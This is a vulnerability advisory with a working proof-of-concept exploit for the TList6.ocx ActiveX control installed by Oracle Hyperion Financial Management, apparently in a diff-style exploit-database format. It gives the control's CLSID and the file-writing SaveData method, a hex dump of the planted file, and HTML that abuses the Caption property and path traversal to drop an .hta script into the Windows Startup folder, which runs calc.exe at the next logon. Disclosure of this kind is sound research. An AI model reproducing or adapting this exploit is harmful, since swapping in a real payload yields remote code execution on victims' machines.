@@ -1,0 +1,139 @@
+Oracle Hyperion Financial Management TList6 ActiveX 
+Control Remote Code Execution Vulnerability
+
+tested against: Internet Explorer 8
+                Microsoft Windows Server 2003 r2 sp2
+
+download url:
+http://www.oracle.com/technetwork/middleware/epm/downloads/index.html
+
+files tested:
+SystemInstaller-11121-win32.zip
+FoundationServices-11121-win32-Part1.zip
+FoundationServices-11121-win32-Part2.zip
+FoundationServices-11121-win32-Part3.zip
+FoundationServices-11121-win32-Part4.zip
+FoundationServices-11121-Part5.zip
+FoundationServices-11121-Part6.zip
+FoundationServices-11121-Part7.zip
+StaticContent-11121.zip
+RandAFoundation-11121.zip
+EPM_Architect-11121.zip
+HyperionFinancialManagement-11121.zip
+
+Background:
+
+the mentioned program installs an ActiveX control with the following
+settings:
+
+Binary Path: C:\WINDOWS\system32\TList6.ocx
+ProgID: TList.TList.6
+CLSID: {65996200-3B87-11D4-A21F-00E029189826}
+Safe for Initialization (Registry): True
+Safe for Scripting (Registry): True
+
+This control is marked "safe for scripting" and "safe for initialization",
+Internet Explorer will allows scripting of this control.
+
+
+Vulnerability:
+
+The mentioned class contains the vulnerable SaveData() method, see typelib:
+
+...
+	/* DISPID=167 */
+	/* VT_I2 [2] */
+	function SaveData(
+		/* VT_BSTR [8]  */ $lpszFileName 
+		)
+	{
+	}
+...
+
+which allows to create / overwrite files with arbitrary extensions
+inside arbitrary locations ex. automatic startup folders. By manipulating 
+ex. the Caption property is possible to create a valid application 
+with .hta extension.
+
+The resulting file will look like this:
+
+0000  00 62 99 65 87 3b d4 11  a2 1f 00 e0 29 18 98 26   .bôeá;‘. ¢..‡).ò&
+0010  09 00 06 00 ac 14 00 00  ac 14 00 00 e4 00 00 00   ....¨... ¨...‰...
+0020  00 03 52 e3 0b 91 8f ce  11 9d e3 00 aa 00 4b b8   ..R„.ëèŒ .ù„.™.K∏
+0030  51 01 00 00 00 90 01 c0  d4 01 00 0f 54 69 6d 65   Q....ê.¿ ‘...Time
+0040  73 20 4e 65 77 20 52 6f  6d 61 6e 01 00 01 01 00   s New Ro man.....
+0050  08 00 00 80 05 00 00 80  0e 00 00 80 0d 00 00 80   ...Ä...Ä ...Ä...Ä
+0060  2c 01 00 00 e1 00 00 00  e1 00 00 00 f1 ff ff ff   ,...·... ·...Òˇˇˇ
+0070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
+0080  00 00 00 00 00 00 00 00  01 5c 61 3e 3e 3e 3e 3e   ........ .\a>>>>>
+0090  3e 3e 3e 3e 3e 3e 3e 3e  3e 3e 3e 3e 3c 53 43 52   >>>>>>>> >>>><SCR
+00a0  49 50 54 3e 20 76 61 72  20 78 3d 6e 65 77 20 41   IPT> var  x=new A
+00b0  63 74 69 76 65 58 4f 62  6a 65 63 74 28 22 57 53   ctiveXOb ject("WS
+00c0  63 72 69 70 74 2e 53 68  65 6c 6c 22 29 3b 20 78   cript.Sh ell"); x
+00d0  2e 45 78 65 63 28 22 43  41 4c 43 2e 45 58 45 22   .Exec("C ALC.EXE"
+00e0  29 3b 20 3c 2f 53 43 52  49 50 54 3e 00 01 01 01   ); </SCR IPT>....
+00f0  03 00 ff ff ff ff ff ff  ff ff 00 01 00 01 00 00   ..ˇˇˇˇˇˇ ˇˇ......
+0100  00 00 00 00 00 00 00 00  00 00 01 00 01 00 00 00   ........ ........
+0110  01 00 00 00 00 00 03 00  01 00 00 00 ff 00 00 00   ........ ....ˇ...
+0120  00 00 00 08 00 00 80 01  00 00 00 00 00 00 00 00   ......Ä. ........
+0130  00 17 00 00 80 18 00 00  80 00 00 00 00 01 00 1a   ....Ä... Ä.......
+0140  62 99 65 87 3b d4 11 a2  1f 00 e0 29 18 98 26 44   bôeá;‘.¢ ..‡).ò&D
+0150  55 02 00 00 00 12 00 06  00 0b 00 02 00 00 00 00   U....... ........
+0160  00 00 04 00 03 00 00 60  ab 4e 06 10 00 00 00 5f   .......` ´N....._
+0170  5f 4f 62 73 6f 6c 65 74  65 56 61 6c 75 65 00 00   _Obsolet eValue..
+0180  00 00 00 00 00 00 00 00  60 ab 4e 06 00 00 00 00   ........ `´N.....
+0190  01 4d 4b 10 00 00 00 00  00 01 00 00 00 02 00 00   .MK..... ........
+01a0  00 03 00 00 00 04 00 00  00 05 00 00 00 06 00 00   ........ ........
+01b0  00 07 00 00 00 08 00 00  00 09 00 00 00 0a 00 00   ........ ........
+01c0  00 0b 00 00 00 0c 00 00  00 0d 00 00 00 0e 00 00   ........ ........
+01d0  00 0f 00 00 00 00 00 ff  00 00 ff ff ff 00 00 00   .......ˇ ..ˇˇˇ...
+01e0  ff 00 00 00 00 00 00 05  00 00 00 02 00 00 00 00   ˇ....... ........
+01f0  00 01 00 00 c0 c0 c0 22  00 00 08 00 00 00 09 00   ....¿¿¿" ........
+0200  01 00 00 80 bf ff 31 00  00 00 8a e3 aa 2b 84 ee   ...Äøˇ1. ..ä„™+ÑÓ
+0210  e5 a0 2b 84 a8 ac a0 0c  00 00 00 35 35 32 58 58   Â +Ñ®¨ . ...552XX
+0220  58 58 58 44 45 4d 4f 08  00 00 00 4a 6f 68 6e 20   XXXDEMO. ...John 
+0230  44 6f 65 1e 00 01 00 00  00 00 40 00 00 ff ff ff   Doe..... ..@..ˇˇˇ
+0240  00 90 01 00 00 02 00 d7  00 00 00 44 55 06 00 00   .ê.....◊ ...DU...
+0250  00 12 00 06 00 0b 00 06  00 00 00 f8 8f 50 04 10   ........ ...¯èP..
+0260  00 00 00 5f 5f 49 6e 6e  65 72 50 69 63 41 6c 69   ...__Inn erPicAli
+0270  67 6e 00 03 00 05 00 00  00 00 10 58 66 04 13 00   gn...... ...Xf...
+0280  00 00 5f 5f 49 6e 6e 65  72 42 6f 72 64 65 72 43   ..__Inne rBorderC
+0290  6f 6c 6f 72 00 03 00 00  00 00 00 00 20 b5 56 08   olor.... .... µV.
+02a0  13 00 00 00 5f 5f 49 6e  6e 65 72 42 6f 72 64 65   ....__In nerBorde
+02b0  72 53 74 79 6c 65 00 03  00 00 00 00 00 00 30 f4   rStyle.. ......0Ù
+02c0  60 08 11 00 00 00 5f 5f  49 6e 6e 65 72 42 61 63   `.....__ InnerBac
+02d0  6b 43 6f 6c 6f 72 00 03  00 c0 c0 c0 02 00 b8 c1   kColor.. .¿¿¿..∏¡
+02e0  33 0d 11 00 00 00 5f 5f  49 6e 6e 65 72 54 65 78   3.....__ InnerTex
+02f0  74 41 6c 69 67 6e 00 03  00 02 00 00 00 00 b8 54   tAlign.. ......∏T
+0300  6d 0d 11 00 00 00 5f 5f  49 6e 6e 65 72 41 6c 69   m.....__ InnerAli
+0310  67 6e 6d 65 6e 74 00 03  00 00 00 00 00 00 2e 00   gnment.. ........
+0320  00 00                                              ..
+
+proof of concept code which launches calc.exe at the next 
+startup:
+
+http://retrogod.altervista.org/9sg_ohfm_poc.html
+
+<!--
+Oracle Hyperion Financial Management 11.1.2.1.0
+TList6.ocx ActiveX Control Remote Code Execution Vulnerability PoC
+
+tested against Internet Explorer 8
+Microsoft Windows 2003 r2 sp2
+
+Binary Path: C:\WINDOWS\system32\TList6.ocx
+ProgID: TList.TList.6
+CLSID: {65996200-3B87-11D4-A21F-00E029189826}
+Safe for Initialization (Registry): True
+Safe for Scripting (Registry): True
+
+rgod
+-->
+<!-- saved from url=(0014)about:internet --> 
+<html>
+<object classid='clsid:65996200-3B87-11D4-A21F-00E029189826' id='obj' />
+</object>
+<script>
+obj.Caption = ">>>>>>>>>>>>>>>>><" + "SCRIPT> var x=new ActiveXObject(\"WScript.Shell\"); x.Exec(\"CALC.EXE\"); <" +"/SCRIPT>";
+obj.SaveData("..\\..\\..\\..\\..\\..\\..\\..\\..\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\suntzu.hta");
+</script>
